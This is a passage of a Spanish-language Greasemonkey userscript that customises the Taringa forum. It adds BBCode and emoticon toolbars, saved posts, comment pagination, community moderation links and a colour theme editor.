	var HTML = '<br><input class="button" value="Mostrar/Ocultar Emoticones" onclick="$(\'#Sharkale_TaringaEmoticones\').toggle(\'blind\');" type="button" title="Mostrar/Ocultar la barra de emoticones rápidos"><input onclick="$(\'#SharkaleColores\').toggle(\'slide\');" class="button" value="Mostrar/Ocutar Coloringa" title="Mostrar/Ocutar Coloringa" type="button"><div id="SharkaleColores" style="display:none;"><object width="550" height="180"><br><embed src="http://img20.imageshack.us/img20/3766/colores.swf" width="550" height="180"  type="application/x-shockwave-flash"/></object><br /><span>Versión modificada del COLORINGA! de <a href="http://flashosfera.com.ar/2008/05/coloringa.html" target="_blank">Flashosfera</a></span></div>';
	$('#emoticons').html(HTML+CrearBarraEmoticones()).attr('style','text-align:center');
	$('a[href="javascript:openpopup()"]').remove();
	var html = '<input id="Btn_Agregar_BBCguardados" class="button" type="button" title="Guardar el BBCode del texto seleccionado para utilizarlo en futuras ocaciones" value="Agregar BBC del texto seleccionado"/>';
		html +='<div id="bbc_nuevos">'+CrearBarraBBCguardados()+'</div>';
		html +='<input id="Btn_Guardar_BBCguardados" class="button" type="button" title="Guardar los cambios realizados en la lista de BBCodes personalizados" value="Guardar cambios del BBC"/><br/><br/>';
		html +='<input id="Btn_Agregar_PostGuardados" class="button" type="button" title="Guardar el Post en el Archivo" value="Agregar Post al Archivo"/>';
		html +='<div id="post_guardados">'+CrearBarraPostGuardados()+'</div>';
		html +='<input id="Btn_Guardar_PostGuardados" class="button" type="button" title="Guardar los cambios realizados en la lista de Post Archivados" value="Guardar cambios del Archivo"/><br/><br/>';
		html +='<input id="Btn_Backup" class="button" type="button" activo="no" title="Backup del último script realizado" value="Activar Auto-Backup"/><input id="Btn_Ver_Backup" type="button" class="button" title="Transferir post guardado por el autobackup al Agregar Post" value="Ver" /><br/><br/>';
		html +='<iframe id="tinypic" src="http://plugin.tinypic.com/plugin/index.php?popts=l,narrow|t,images|c,forum|i,es|s,false" style="" scrolling="no" width="235" frameborder="0" height="317"></iframe>';
	
	$('#form_div div:first div:last').html(html);
	$('#Btn_Agregar_BBCguardados').click(function() {Agregar_BBCguardados();});
	$('#Btn_Guardar_BBCguardados').click(function() {Guardar_BBCguardados();});
	$('#Btn_Agregar_PostGuardados').click(function() {Agregar_PostGuardados();});
	$('#Btn_Guardar_PostGuardados').click(function() {Guardar_PostGuardados();});
	$('#Btn_Backup').click(function() {Backup_on_off();});
	$('#Btn_Ver_Backup').click(function() {Ver_backup();});
	break;
case 'mensajes':
	///////////////------------------Agregar BBCodes--------------------////////////////////
	GM_addStyle(".m-col2e{ width:600px;float:left;padding:5px; font-size:12px; }");
	$.timer(100,function(timer){
		timer.stop();
		$('div[class="markItUpHeader"]').html(CrearBarraBBC());
	});
	var HTML = '<br><input class="button" value="Mostrar/Ocultar Emoticones" onclick="$(\'#Sharkale_TaringaEmoticones\').toggle(\'blind\');" type="button" title="Mostrar/Ocultar la barra de emoticones rápidos"></div>';
	$('#emoticons').html(HTML+CrearBarraEmoticones()).attr('style','text-align:center');
	$('a[href="javascript:openpopup()"]').remove();
	$('#emoticons').before('<div id="return_agregar_comentario" style="display: none;"></div>');
	break;
case 'leermp':
	var remitente = $('a[title="Ver Perfil"]:first');
	var remit_id = remitente.attr('href').split('/')[2];
	remitente.after(' <a href="javascript:bloquear(\''+remit_id+'\', true, \'comentarios\')" class="bloquear_usuario_'+remit_id+'"><img title="Bloquear Usuario" alt="bloquear" src="http://i.t.net.ar/images/bloquear.png"/></a>');
	break;
case 'principal':
	$('head meta[content=600]').remove();
	GM_addStyle('.sticky {background-position:5px -21px;padding:3px 3px 3px 20px;}');
	$('#topsPostBox div.box_cuerpo,#topsUserBox div.box_cuerpo').css('height','330px').find('ol.filterBy').css('height','295px');
	$('#r_b_taringa').attr('checked','checked');
	$('#centro').prepend($('#derecha .climaHome').clone().css('margin-bottom','6px'));
	$('#derecha').html('');
	$('div[class="box_txt ultimos_posts"]:first').append('<a href="" onclick="act_post_nfu();return false;" title="Actualizar Post" > <img src="'+urlimg+'act_comment.png" align="top" height="16" width="16" /></a>');
	var ant = $('#izquierda div[class=size13] a:contains(« Anterior)');
	var sig = $('#izquierda div[class=size13] a:contains(Siguiente »)');
	if(ant.size() != 0){
		ant.attr('url', ant.attr('href'));
		ant.click(function(){unsafeWindow.act_post_nfu(ant.attr('url'));return false;});
		ant.attr('href','');
	}
	if(sig.size() != 0){
		sig.attr('url', sig.attr('href'));
		sig.click(function(){unsafeWindow.act_post_nfu(sig.attr('url'));return false;});
		sig.attr('href','');
	}
	
	var htmlFiltro = '<div id="filtroNFU"><div class="box_title"><span class="box_txt estadisticas">Filtrar categorias</span><div class="box_rss"><a onclick="$(\'#filtroNFUbox\').toggle(\'slideDown\');return false;" class="size9" href="#">(Mostrar/Ocultar)</a></div></div>';
	htmlFiltro += '<div id="filtroNFUbox" class="box_cuerpo" style="display:none"><table width="100%" cellspacing="2" cellpadding="2" border="0"><tbody><tr>';
	if(Tar){
		var catL = CategoriasT.length-3;
		for(var i = 0;i <= catL;i = i+3){
			htmlFiltro += '<td><a onclick="act_post_nfu(\'posts/'+CategoriasT[i+1]+'\');return false;" href="">'+CategoriasT[i+2]+'</a></td>';
			if(i%6 == 3 && i != catL) htmlFiltro += '</tr><tr>';
		}
	}else{
		var catL = CategoriasP.length-3;
		for(var i = 0;i <= catL;i = i+3){
			htmlFiltro += '<td><a onclick="act_post_nfu(\'posts/'+CategoriasP[i+1]+'\');return false;" href="">'+CategoriasP[i+2]+'</a></td>';
			if(i%6 == 3 && i != catL) htmlFiltro += '</tr><tr>';
		}
	}
	htmlFiltro += '</tr></tbody></table></div><br class="space">';
	$('#estadisticasBox').after(htmlFiltro);
	if(NovatosPrinc){
		GM_addStyle("#izquierda {float:left;height:auto;padding: 2px;width:315px;overflow: hidden;}" +
					"* html #izquierda {width: 300px;}" +
					".box_txt.ultimos_posts {width: 200px!important;}" +
					"#derecha .box_txt, .box_txt.para_un_buen_post {width: 200px!important;}" +
					"#derecha {padding:2px;float:left;height:auto;width:315px;overflow:hidden;}" +
					".categoriaPost a{overflow:hidden;height:15px}" +
					"#centro .box_cuerpo a{font-size:10px;}" +
					"* html #derecha {width: 303px;}" +
					".box_link {font-size:10px;padding-left:2px;}");
		$.ajax({
			type: "GET",
			url: 'http://'+Dom+'/posts/novatos/',
			success: function(h){
				var secc_nov = $(h).find('#izquierda').html();
				$('#derecha').hide().html(secc_nov).fadeIn('slow');
				$("div[class='box_txt ultimos_posts']:last:contains(posts)").html('Post de Novatos <a href="" onclick="act_post_nov();return false;" title="Actualizar Post" > <img src="'+urlimg+'act_comment.png" align="top" height="16" width="16" /></a>');
				var ant = $('#derecha div[class=size13] a:contains(« Anterior)');
				var sig = $('#derecha div[class=size13] a:contains(Siguiente »)');
				if(ant.size() != 0){
					ant.css('font-weight','bold');
					ant.attr('url', ant.attr('href'));
					ant.click(function(){unsafeWindow.act_post_nov(ant.attr('url'));return false;});
					ant.attr('href','');
				}
				if(sig.size() != 0){
					sig.css('font-weight','bold');
					sig.attr('url', sig.attr('href'));
					sig.click(function(){unsafeWindow.act_post_nov(sig.attr('url'));return false;});
					sig.attr('href','');
				}
				secc_nov = null;
			}
		});
	}
	break;
case 'perfil':
	var perfilde = $('h1.nick').clone();
	perfilde.find('span').remove();
	perfilde = $.trim(perfilde.html());
	if(perfilde == "Sharkale"){
		$('.w-stats li:has(span:contains(Rango))').css('width','170px').html('Ultra Mega User<span>Rango</span>');
		$('.w-stats li:has(span:contains(Puntos))').css('width','140px').html('18726354<span>Puntos Premium</span>');
		$('.w-stats li:has(span:contains(Seguidores))').html('654763<span>Seguidores</span>');
		$('.w-stats li:has(span:contains(Posts))').css('width','60px');
		$('.perfil-info a[href*="bloquear"]').attr('href','javascript:alert("¿Cómo vas a ser tan sorete de bloquear al creador del script que estas usando? ^^")');
	}
	if(perfilde == "yasserock"){
		$('.w-stats li:has(span:contains(Rango))').css('width','170px').css('background-repeat','no-repeat').css('color','#000000').html('Ultra Mega VIP User<span>Rango</span>');
		$('.w-stats li:has(span:contains(Puntos))').css('width','140px').html('193422<span>Puntos Premium</span>');
		$('.w-stats li:has(span:contains(Seguidores))').html('72632<span>Seguidores</span>');
		$('.w-stats li:has(span:contains(Posts))').css('width','60px');
		$('.w-stats li').css('color','#000000');
		$('.perfil-info a[href*="bloquear"]').attr('href','javascript:alert("¿Cómo vas a ser tan mala gente de bloquear al que continuo y arreglo el script que estas usando?")');
	}
	if (perfilde == "luckyy196"){
		$('.w-stats li:has(span:contains(Rango))').css('width','170px').css('background-repeat','no-repeat').html('Full User T!<span>Rango</span>');
		$('.w-stats li:has(span:contains(Posts))').css('width','60px');
	}
	
	GM_addStyle(".link {height:16px;overflow:hidden;padding:3px;width:480px;}.categoriaPost{padding:3px 3px 3px 25px;font-size:11px;}.categoriaPost a{display:inline;padding-right:2px;}.categoriaPost img{display:inline}.categoriaPost span{font-weight:bold!important;}");
	if(perfilde == user){
		var mislinks = $('.w-posts ul.ultimos a[href*="/posts/"]');
		for (var i = 0; i < mislinks.size(); i++) {
			var esteLink = mislinks.eq(i);
			var key = datospag.user_key;
			var numpost = esteLink.attr('href').split('/')[3];
			var categ = esteLink.attr('href').split('/')[2];
			var HTML = '<a href="" onclick="global_data.postid=\''+numpost+'\';borrar_post();return false;" title="Eliminar Post"><img src="'+urlimg+'eliminar.png" align="absmiddle"/></a> ';
			HTML += '<a href="http://'+host+'/edicion.form.php?id='+numpost+'" title="Editar Post"><img src="'+urlimg+'editar.png" align="absmiddle"/></a> ';
			HTML += '<a href="" onclick="administrar_post(\''+key+'\',\''+numpost+'\');return false;" title="Administrar Post"><img src="'+urlimg+'adminis.png" align="absmiddle"/></a> ';
			esteLink.before(HTML);
		}
	}
	$('.w-comunidades').find('.clearfix:first').after('- ');
	$('.w-comunidades').find('a[href^="/comunidades/"]').after('<br>');
	$.ajax({
		type: 'GET',
		url: 'http://'+Dom+'/api/shark32455Dfa/json/Users-GetUserData/'+perfilde,
		success: function(h){
			var userdata = new Function("return "+h)();
			var sexo = userdata['profile']['sex'];
			var pais = userdata['profile']['country'].replace(/amp;/g,'');
			$('.basicData').prepend('<li><strong> Sexo:</strong> <span>'+sexo+'</span></li><li><strong> País:</strong> <span>'+pais+'</span></li>');
			$('.sendMsg').after('<div class="sendMsg"><a title="Verificar estado en linea del usuario" href="" onclick="verificar_estado(\''+perfilde+'\',\''+(sexo == 'Masculino'? 'm':'f')+'\'); return false;">Verificar Estado</a></div>');
		},
		error: function(h){
			$('.sendMsg').after('<div class="sendMsg"><a title="Verificar estado en linea del usuario" href="" onclick="verificar_estado(\''+perfilde+'\',\'a\'); return false;">Verificar Estado</a></div>');
		}
	});
	break;
case 'comunidades':
	modificar_posts();
	$('div[class*=ads]').remove();
	$('.breadcrump ul,.breadcrump ul li').css('-moz-border-radius','5px');
	$('.breadcrump ul li[class=last]').remove();
	$('.breadcrump ul li:last').css('padding-right','10px');
	$('#izquierda .box_title:first div').css('background','none');
	$('.denunciar').css('background','url("'+urlimg+'denunciar.png") no-repeat scroll left top transparent');
	if(regComu.exec($('#izquierda a:first').attr('href'))){
		GM_addStyle('.comunidadData {overflow:visible!important;}');
		$('#izquierda').find('div[class="comunidadData"]:first').addClass('oficial');
		$('#izquierda').find('div[class="box_cuerpo"]:first').prepend('<img class="riboon" src="http://i.t.net.ar/images/riboon_top.png"/>');
	}
	
	if($('#izquierda a:first').attr('href') == '/comunidades/comunidaduruguayos/'){
		GM_addStyle('.comunidadData {overflow:visible!important;}');
		$('#izquierda').find('div[class="comunidadData"]:first').addClass('oficial');
		$('#izquierda').find('div[class="box_cuerpo"]:first').prepend('<img class="riboon" src="http://i.t.net.ar/images/riboon_top.png"/>');
		$('#izquierda').find('div[class="box_cuerpo"]:first').css('background-color','#94C3EE'); //turquesita:#80FFFF   celeste: #94C3EE
	}
	
	
	GM_addStyle('.answerInfo{text-align:left;margin-bottom:5px;width:500px;}.respuesta img.imagen{max-width:740px!important}input.checkbox, input.radio, input[type="checkbox"], input[type="radio"] {width:0px !important;}\
				.avatar-box li.administrar a:hover span {background-position:0 -64px;}#respuestas .citacuerpo {background:url("http://i.t.net.ar/images/bg-box.gif") repeat-x scroll 0 0 #FFFFFF;padding:8px;border:1px solid #C0C0C0;}#respuestas blockquote blockquote {display:block;}#respuestas blockquote blockquote blockquote blockquote {display:none;}#respuestas .citacuerpo p {background:none;}');
	var rango = $('.comunidadData div[class="box_cuerpo"] b:first').html();
	var users_com = $('.avatar-box ul');
	var nick_user,id_user;
	if(rango == "Administrador" || rango == 'Moderador'){
		GM_addStyle('.userIcons li {float:left;margin-right:4px;}');
		var id = /[0-9]+$/.exec($('.postBy a[href^="/perfil/"]:not(:contains('+user+')):eq(1)').attr('href'));
		if(id != null) $('.postBy ul').append('<li><a href="javascript:com.admin_users(\''+id+'\')"><img src="'+urlimg+'admin.png" /></a></li>');
		for(var i=0;i<users_com.size();i++){
			nick_user = users_com.eq(i).find('li:eq(0) a').attr('href').split('/')[3];
			id_user   = /[0-9]+$/.exec(users_com.eq(i).find('li:eq(1)').attr('class'));
			users_com.eq(i).append('<li class="administrar"><a href="javascript:com.admin_users(\''+id_user+'\')">Administrar Usuario<span></span></a></li><li class="administrar"><a href="/buscador-taringa.php?autor='+nick_user+'" target="_blank">Sus posts<span></span></a></li><li class="administrar"><a href="http://buscar.taringa.net/comunidades?type=temas&q=*&autor='+nick_user+'" target="_blank">Sus temas<span></span></a></li><li class="administrar"><a href="/perfil/'+nick_user+'/comentarios" target="_blank">Sus comentarios<span></span></a></li><li class="administrar"><a href="" onclick="notifica.follow(\'user\', '+id_user+', notifica.userInPostHandle, null);return false;" target="_blank">Seguir Usuario<span></span></a></li>');
		}
		$('#izquierda').append('<div class="adminOpt"><div class="box_title"><div style="width: 142px;" class="box_txt">Administrar Usuarios</div></div><div class="box_cuerpo"><input type="text" class="iTxt" id="nick_admin_user" value="Nick del usuario" title="Nick del usuario" onblur="onblur_input(this)" onfocus="onfocus_input(this)" onclick="this.select()" style="width: 138px;"><br><br><input type="button" class="mBtn btnYellow" onclick="admin_user()" value="Administrar Usuario"></li></ul></div></div>');
	}else{
		for(var i=0;i<users_com.size();i++){
			nick_user = users_com.eq(i).find('li:eq(0) a').attr('href').split('/')[3];
			id_user   = /[0-9]+$/.exec(users_com.eq(i).find('li:eq(1)').attr('class'));
			users_com.eq(i).append('<li class="administrar"><a href="/buscador-taringa.php?autor='+nick_user+'" target="_blank">Sus posts<span></span></a></li><li class="administrar"><a href="http://buscar.taringa.net/comunidades?type=temas&q=*&autor='+nick_user+'" target="_blank">Sus temas<span></span></a></li><li class="administrar"><a href="/perfil/'+nick_user+'/comentarios" target="_blank">Sus comentarios<span></span></a></li><li class="administrar"><a href="" onclick="notifica.follow(\'user\', '+id_user+', notifica.userInPostHandle, null);return false;" target="_blank">Seguir Usuario<span></span></a></li>');
		}
	}
	if(location.href.split('/')[4] == 'mis-comunidades') return;
	$('#temaComunidad').find('img[class="avatar"]').attr('style', 'max-width:100px !important;border-bottom:1px solid #FFFFFF;display:inline;').removeClass('avatar');
	if($('.bubbleCont').size() >= 1){
		$('.bubbleCont:eq(1) .temas td:has(img)').html('<span style="background: url(http://i.t.net.ar/images/big1v11.png) no-repeat scroll 0px -21px transparent; padding: 3px 0pt 0pt 16px;"></span>');
		var comu_links = $('.bubbleCont td[class="temaTitulo"]');
		for(var i=0;i<comu_links.size();i++){
			var comu_link = comu_links.eq(i).find('a').attr('href').split('/');
			comu_links.eq(i).find('span').append(' - <a href="'+location.href+comu_link[3]+'.ultima/'+comu_link[4]+'">Ir a la última página</a>');
		}
	}
	if($('.temaCont .floatR:first').size() > 0){
		GM_addStyle('h1.titulopost{width:420px}');
		$('#cuerpocontainer').append('<div align="center" style="margin:10px;font-weight:bold;"><a id="pie-a" href="#maincontainer"><img src="'+urlimg+'arriba.png" title="Ir al Cielo"/> Ir al Cielo</a></div>');
		var Tierra = (!LinkCheck? '<a class="btnActions" href="" id="linkchecker" title="Verificar disponibilidad de los links"><img src="'+urlimg+'link.png" align="absmiddle"/></a> ':'')+'<a class="btnActions" href="#pie-a" title="Ir a la Tierra"><img src="'+urlimg+'abajo.png" align="absmiddle"/></a>';
		var barOpc = $('.temaCont .floatR:first');
		barOpc.html(barOpc.html().replace(/Editar|Borrar/g,''));
		$('.temaCont .floatR:first').prepend(Tierra);
		$('.shareBox').append('<a style="padding-left: 16px;" class="icons agregar_favoritos" href="" title="Agregar a Favoritos" id="add_favs_tema"></a>').css('width','18%');
		$('.rateBox').css('width','12%');
		$('#add_favs_tema').click(function(){add_favs_tema(unsafeWindow.global_data.temaid);return false;});
	}
	//--Numeración de comentarios--//
	var n_com_ini = 20 * parseInt($('a[class=here]:first').html()) - 20 || 0;
	var n_com = $('.comment-info .nick');for(var i=0;i < n_com.size();i++){n_com.eq(i).before('#'+(i+n_com_ini+1)+' - ');}
	$('.comment-info div.floatR ul').append('<li><a href="#maincontainer" title="Ir a la Cielo"><img src="'+urlimg+'arriba.png"/></a></li><li><a href="#pie-a" title="Ir a la Tierra"><img src="'+urlimg+'abajo.png"/></a></li>');
	$('.paginadorCom').css('width','755px').find('ul:first').css('width','500px').parent().css('width','520px');
	$('.paginadorCom ul:last').css('width','500px').parent().css('width','520px');
	$('.titulorespuestas').append(' <a href="" onclick="act_comment($(\'a[class=here]:first\').html());return false;"> <img src="'+urlimg+'act_comment.png" class="carg_act_comm" title="Actualizar Comentarios" height="15" align="absmiddle" style="margin-left:5px;"/></a>');
	$('.before a').click(function(){unsafeWindow.act_comment((parseInt($('a[class=here]:first').html())-1));return false;});
	$('.next a').click(function(){unsafeWindow.act_comment((parseInt($('a[class=here]:first').html())+1));return false;});
	var botonera = $('.paginadorCom').find('li');
	var lb;
	for(var i=0;i < botonera.size();i++){
		lb = botonera.eq(i).find('a');
		lb.click(function(){unsafeWindow.act_comment(this.innerHTML);return false;});
	}
	GM_addStyle(".answerTxt{float:left;width:760px;margin-left:0px;}.dialogBox{display:none;}");
	$('div[id^=id_][class!=especial1]:has(div.avatar-box a[href=/perfil/'+user+'])').addClass('especial2');
	$('strong:contains("'+user+'")').parent().parent().find('div.citacuerpo:first').addClass('especial2');
	$('img[class="dialogBox"]').remove();
	///////////////------------------Modificar Agregar Comentario--------------------////////////////////
	if($("#body_resp").size() != 0){
		$('.answerInfo').remove();
		///////////////-------------------------Agregar BBCodes--------------------------////////////////////
		var puntuar = $('div[class=rateBox]').clone();
		puntuar.find('strong').remove();puntuar.find('script').remove();
		puntuar.find('#votos_total').css('font-weight','bold');
		$.timer(100,function(timer){
			timer.stop();
			$('.markItUpHeader').html('<div style="width:640px;float:left;height:50px;"><span style="float:left;text-align:left;">'+CrearBarraBBC()+'</span><span style="float:right;text-align:left;">'+puntuar.html()+'</span></div><div style="float:right;">'+CrearBarraColores()+'</div>');
		});
		///////////////-----------------------Agregar Emoticones-------------------------////////////////////
		$('div[class="miRespuesta"]:first').before('<div id="return_agregar_comentario" style="display: none;"></div>');
		$("#body_resp").css('min-height','283px').css('width','630px');
		BotonOcultar = '<input class="button" value="Mostrar/Ocultar Emoticones" onclick="$(\'#Sharkale_TaringaEmoticones\').toggle(\'blind\');" type="button" title="Mostrar/Ocultar la barra de emoticones rápidos">';
		$('#button_add_resp').before('<span style="float:left;">'+BotonOcultar+'</span><span id="seccion_enviar" style="float:right;"></span><br><br>'+CrearBarraEmoticones());
		$('#button_add_resp').attr('id','sharkborrar').clone(true).attr('id','button_add_resp').removeClass('mBtn btnOk').addClass('button').prependTo('#seccion_enviar');
		$('#sharkborrar').remove();
		unsafeWindow.global_data.postid = ($('a[class=here]:first').html() == $('.paginadorCom:first .numbers:last a').html()? 'true':'false');
		$('#seccion_enviar').html('<input type="button" tabindex="2" value="Responder" class="button" id="button_add_resp" onclick="com.add_resp(global_data.postid)">');
		GM_addStyle('.Sharkale_cargando {display:none;}');
		HTML = '<input type="button" value="Ver Preview del Comentario" class="button" title="Ver Preview del Comentario" onclick="preview()">';
		$('#ocultar_emot').before(HTML);
	}
	break;
case 'comuagregar':
	$('div[class*=ads]').remove();
	$('.breadcrump ul,.breadcrump ul li').css('-moz-border-radius','5px');
	$('.breadcrump ul li[class=last]').remove();
	$('.breadcrump ul li:last').css('padding-right','10px');
	$('#izquierda .box_title:first div').css('background','none');
	if(regComu.exec($('#izquierda a:first').attr('href'))){
		$('#izquierda').find('div[class="comunidadData"]:first').addClass('oficial');
		$('#izquierda').find('div[class="box_cuerpo"]:first').prepend('<img class="riboon" src="http://i.t.net.ar/images/riboon_top.png"/>');
	}
	if($('#izquierda a:first').attr('href') == '/comunidades/comunidaduruguayos/'){
		$('#izquierda').find('div[class="comunidadData"]:first').addClass('oficial');
		$('#izquierda').find('div[class="box_cuerpo"]:first').prepend('<img class="riboon" src="http://i.t.net.ar/images/riboon_top.png"/>');
	}
	
	GM_addStyle('#return_agregar_comentario{padding:10px 0px;width: 640px !important;}.citacuerpo{padding:8px;}');
	$.timer(100,function(timer){
		timer.stop();
		$('.markItUpHeader').html('<div class="msg_add_comment" style="display: none;"></div>'+CrearBarraBBC());
		$('#markItUp,:text[name="titulo"],:text[name="tags"]').attr('style','width:640px !important; padding:10px 0px');
		BotonOcultar = '<input class="button" value="Mostrar/Ocultar Emoticones" onclick="$(\'#Sharkale_TaringaEmoticones\').toggle(\'blind\');" type="button" title="Mostrar/Ocultar la barra de emoticones rápidos">';
		$('#markItUp').parent().after('<div id="return_agregar_comentario" style="display: none;"></div><div style="width: 640px !important;">'+BotonOcultar+CrearBarraEmoticones()+'</div>');
		setTimeout("jQuery('.markItUpHeader img').tipsy({gravity: 's'});",100);
	});
	break;
case 'monitor':
	break;
case 'favs':
	var num = GM_getValue('temasFavs','');
	if(num != '') num = num.split('//#//').length/3;else num = 0;
	$('.categoriaList ul').append('<li id="cat_tema"><a href="">Temas de Comunidades</a> ('+num+')</li>');
	$('#cat_tema a').click(function(){filtro_favs_temas();return false;});
	break;
case 'buscador':
	GM_addStyle('.linksList .categoriaPost {width:0}');
	if($(':input[name="autor"]').val().toLowerCase() == user.toLowerCase()){
		var mislinks = $('#showResult a[href*="/posts/"]');
		for (var i = 0; i < mislinks.size(); i++) {
			var esteLink = mislinks.eq(i);
			var key = datospag.user_key;
			var numpost = esteLink.attr('href').split('/')[3];
			var categ = esteLink.attr('href').split('/')[2];
			var HTML = '<a href="" onclick="global_data.postid=\''+numpost+'\';borrar_post();return false;" title="Eliminar Post"><img src="'+urlimg+'eliminar.png" align="absmiddle"/></a> ';
			HTML += '<a href="http://'+host+'/edicion.form.php?id='+numpost+'" title="Editar Post"><img src="'+urlimg+'editar.png" align="absmiddle"/></a> ';
			HTML += '<a href="" onclick="administrar_post(\''+key+'\',\''+numpost+'\');return false;" title="Administrar Post"><img src="'+urlimg+'adminis.png" align="absmiddle"/></a> ';
			esteLink.before(HTML);
		}
	}
	break;
case 'buscador-ext':
	user = $('.nick span').html().toLowerCase();
	var busc_links = $('.result-i h2 a');
	for (var i = 0; i < busc_links.size(); i++) {
		var esteLink = busc_links.eq(i);
		var tip = esteLink.attr('href').split('/')[3];
		var com = esteLink.attr('href').split('/')[4];
		var num = esteLink.attr('href').split('/')[5];
		var tit = esteLink.attr('href').split('/')[6];
		esteLink.after(' <a href="http://www.taringa.net/'+tip+'/'+com+'/'+num+'.ultima/'+tit+'" style="color:#7777CC;font-size:11px">• Última Página</a>');
		if(RegExp('autor='+user).exec(location.href.toLowerCase())){
			if(tip == 'posts'){
				var HTML = '<a href="http://www.taringa.net/edicion.form.php?id='+num+'" title="Editar Post"><img src="'+urlimg+'editar.png" align="absmiddle" border="0"/></a> ';
				esteLink.before(HTML);
			}else{
				var HTML = '<a href="http://www.taringa.net/comunidades/'+com+'/editar-tema/'+num+'/" title="Editar Tema"><img src="'+urlimg+'editar.png" align="absmiddle" border="0"/></a> ';
				esteLink.before(HTML);
			}
		}
	}
	break;
}
});

$(':button[class*="ui-state-default"],:submit[class*="ui-state-default"]').hover(
	function() { $(this).addClass('ui-state-hover'); }, 
	function() { $(this).removeClass('ui-state-hover'); }
);

////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////////////////////////////

function Guardar_Theme() {
	theme = {fondofuera:$("#Sharkale_Theme").find(":input:eq(0)").val(),
			borde:$("#Sharkale_Theme").find(":input:eq(1)").val(),
			fondodentro:$("#Sharkale_Theme").find(":input:eq(2)").val(),
			fondopost:$("#Sharkale_Theme").find(":input:eq(3)").val()};
	GM_setValue("theme"+(Tar? '':'Por'), uneval(theme));
	window.clearInterval(inter);
	$("#Sharkale_Theme").remove();
}

function Cancelar_Theme() {
	addStyle(eval(GM_getValue('theme'+(Tar? '':'Por'),'({fondofuera:"#000000", borde:"#480C0C", fondodentro:"#BBBBBB", fondopost:"#CCCCCC" })')));
	window.clearInterval(inter);
	$("#Sharkale_Theme").remove();
}

function Cambiar_Theme() {
	document.documentElement.scrollTop = 0;
	var theme = eval(GM_getValue('theme'+(Tar? '':'Por'),'({fondofuera:"#000000", borde:"#480C0C", fondodentro:"#BBBBBB", fondopost:"#CCCCCC" })'));
	var html = '<div id="Sharkale_Theme" style="position: absolute; left: '+((window.innerWidth / 2) - 288)+'px; top: 50px; z-index: 1337; background: rgba(255, 255, 255, 0.8) !important;-moz-border-radius:7px;padding:7px !important;-moz-box-shadow:0px 0px 30px rgba(0, 0, 0, 0.9);width: 577px">';
	html += '<table><th colspan="2"><h2 style="text-shadow:1px 2px 1px #999999; margin:10px 0px">Cambiador de Theme!</h2>Salga del recuadro para transparentar</th><tr style="font-weight:bold;text-align:center"><td>Fondo fuera del borde</td><td>Borde</td></tr>';
	html += '<tr><td><div id="fondofuera"><input value="'+theme.fondofuera+'" class="color" type="text"></div></td>';
	html += '<td><div id="borde"><input value="'+theme.borde+'" class="color" type="text"></div></td></tr>';
	html += '<tr style="font-weight:bold;text-align:center"><td>Fondo dentro del borde</td><td>Fondo de post y comentarios</td></tr>';
	html += '<tr style="font-weight:bold;text-align:center"><td>Recom: #BBBBBB - Orig: #FFFFFF</td><td>Recom: #CCCCCC - Orig: #EEEEEE</td></tr>';
	html += '<tr><td><div id="fondodentro"><input value="'+theme.fondodentro+'" class="color" type="text"></div></td>';
	html += '<td><div id="fondopost"><input value="'+theme.fondopost+'" class="color" type="text"></div></td></tr>';
	html += '<tr><td></td><td></td></tr></table>';
	html += '<div style="float: right;"><input id="Btn_Guardar_Theme" class="button" value="Guardar!" type="button"><input id="Btn_Cancelar_Theme" class="button" value="Cancelar" type="button"></div>';

	$('body').after(html);
	$('#Btn_Guardar_Theme').click(function() {Guardar_Theme();});
	$('#Btn_Cancelar_Theme').click(function() {Cancelar_Theme();});
	$('#Sharkale_Theme').mouseenter(function(){
		$(this).unbind('mouseout');
		$(this).fadeTo("slow", 1, function(){
			$(this).mouseout(function(ev){
				GM_log(ev.clientX+"   "+ev.clientY);
				if(ev.clientX < $(this).offset().left || ev.clientX > $(this).width()+$(this).offset().left
					|| ev.clientY < $(this).offset().top || ev.clientY > $(this).height()+$(this).offset().top){
					$(this).fadeTo(1000, 0.05);
				}
			});
		});
	});

	var v_fondofuera = '';
	var v_borde = '';
	var v_fondodentro = '';
	var v_fondopost = '';
	inter = window.setInterval(function (){
		var fondofuera = $("#Sharkale_Theme").find(":input:eq(0)").val();
		var borde = $("#Sharkale_Theme").find(":input:eq(1)").val();
		var fondodentro = $("#Sharkale_Theme").find(":input:eq(2)").val();
		var fondopost = $("#Sharkale_Theme").find(":input:eq(3)").val();
		if(v_fondofuera != fondofuera || v_borde != borde || v_fondodentro != fondodentro || v_fondopost != fondopost) {
			addStyle({fondofuera:fondofuera, borde:borde, fondodentro:fondodentro, fondopost:fondopost});
		}
		v_fondofuera = fondofuera;
		v_borde = borde;
		v_fondodentro = fondodentro;
		v_fondopost = fondopost;
	},500);

  var IMAGEN_CRUZ = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAABUAAAAVAgMAAADUeU0FAAAACVBMVEUAAPD%2F%2F%2F8AAAAXuLmo"+
     "AAAAAXRSTlMAQObYZgAAAAFiS0dEAIgFHUgAAAAJcEhZcwAACxMAAAsTAQCanBgAAAAHdElNRQfWAxYAMBoYReiIAAAAHXRFWHRD"+
     "b21tZW50AENyZWF0ZWQgd2l0aCBUaGUgR0lNUO9kJW4AAAAhSURBVAiZY2RgULvFwMBILrWK4Q8LwzXGUBD1GsajzEwAP%2FoZVv"+
     "c4N8oAAAAASUVORK5CYII%3D";
  var IMAGEN_HUE_BARRA = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACMAAADICAIAAADtOM9PAAAABmJLR0QA%2FwD%2FAP%2BgvaeTAAAA"+
     "CXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH1gMXAjE1EbdXmwAAAQlJREFUeNrtmlEOgkAMRBupy%2BL97wqsgnICPtSM7uR5gZ"+
     "fHTBtKzGeIfhmjjFQNnSZywsmeRPdwYp7ICaf%2B3yMcnx7dw%2BlH87SlirQXFWmRXZ9r%2BDk5klYaAYkdgdMJaWYb0T2cmNwT"+
